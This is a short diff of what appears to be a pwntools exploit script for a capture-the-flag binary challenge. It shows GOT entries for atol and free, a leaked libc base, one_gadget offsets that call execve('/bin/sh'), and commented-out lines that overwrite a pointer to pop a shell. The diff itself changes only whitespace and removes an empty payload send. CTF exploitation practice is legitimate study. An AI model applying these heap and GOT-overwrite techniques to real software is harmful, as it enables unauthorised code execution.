@@ -46,12 +46,8 @@ def ddebug(b=""):
     pause()
 
 
-
 atol_got = elf.got["atol"]
 free_got = elf.got["free"]
-
-payload = b""
-io.sendline(payload)
 
 write_adr = 0x04012B1
 chunk_ptr = 0x403580
@@ -82,7 +78,7 @@ log.success("libc.address:-----> " + hex(libc.address))
 0xe3b01 execve("/bin/sh", r15, rdx)
 0xe3b04 execve("/bin/sh", rsi, rdx)
 """
-#one_gadget = 0xe3b01
+# one_gadget = 0xe3b01
 # ddebug("b *{}".format(libc.address+one_gadget))
 # edit(0, p64(libc.address + one_gadget))
 # delete(0)
